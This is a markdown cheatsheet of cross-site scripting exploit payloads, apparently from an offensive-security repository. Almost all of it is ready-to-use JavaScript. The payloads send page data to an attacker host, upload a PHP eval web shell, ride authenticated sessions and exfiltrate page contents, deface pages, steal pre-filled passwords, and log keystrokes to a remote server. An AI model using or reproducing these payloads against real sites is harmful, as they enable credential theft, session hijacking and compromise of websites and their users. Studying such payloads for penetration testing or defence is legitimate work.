# XSS Exploit Cheatsheet

=====

## Send something back or CSRF

GET

```javascript
var uri = "http://<myip>/";
var query = "?message=" + encodeURIComponent("<some-data>");
xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
	if (xhr.readyState == XMLHttpRequest.DONE) {
		// do something after sent
	}
}
xhr.open("GET", uri + query, true);
xhr.send();
```

POST (application/json)

```javascript
var req = new XMLHttpRequest();
req.open("POST", "http://<target>", true); 
req.setRequestHeader("Content-type", "application/json");
req.send(JSON.stringify({
    data: "data"
}));
```

POST (multipart-formdata)

```javascript
var code = "<? eval($_REQUEST[0]);";
var ctype = "text/plain";
var fname = "g.php";
var form = new FormData();
form.append("newAttachment", new Blob([code],  { type: ctype }), fname);

var uri = "http://<target>/";
xhr = new XMLHttpRequest();
xhr.open("POST", uri, true);
xhr.send(form);
```

## Session Riding

```javascript
var href = "http://<target>/somepage";
fetch(href, {
    "credentials": 'include',
    "method": "get",
})
.then((response) => {
    return response.text();
})
.then( text => {
	// post something back
	fetch("http://<myip>/record", {
		method: "POST",
		headers: {
            "content-Type": "application/json"
        },
        body: JSON.stringify({
            url: href,
            content: text
        })
	})
})
```

## Defacement

```javascript
html_element = document.getElementsByTagName('html')[0];
html_element.innerHTML = '<!DOCTYPE html><html lang="en"> ... </html>';
```

## Fetch auth pages

Based on `<iframe>`, we can delay N seconds and grab all `<a>` to fetch pages. See [fetchAuth.js](utils/fetchAuth.js).

## Capture pre-filled password

```javascript
var source = 'https://myip'
Array.from(document.forms).forEach( form => {
    Array.from(form.elements).forEach(elem => {
        if(elem.type === "password") {
            fetch(source + "/prefill", {
                method: "POST",
                headers: {
                    "content-Type": "application/json"
                },
                body: JSON.stringify({
                    name: elem.name,
                    value: elem.value
                })
            });
        }
    });
});
```

## KeyLogger

```javascript
var source = 'https://myip';
var recordObj = {};
document.onkeypress = function (e) {
    var current = document.activeElement;
    recordObj[current.name] = recordObj[current.name] || "";
    recordObj[current.name] += e.key;

    
    var req = new XMLHttpRequest();
    req.open("POST",source + "/keylog", true); 				// ADD URL HERE!
    req.setRequestHeader("Content-type", "application/json");
    req.send(JSON.stringify({
        data: recordObj[current.name],
        tagname: current.name,
        tagval: current.value
    }));
    
}
```

## API Server on Attacker side

use `Flask-Cors` to serve resource. See [apiServ.py](utils/apiServ.py)

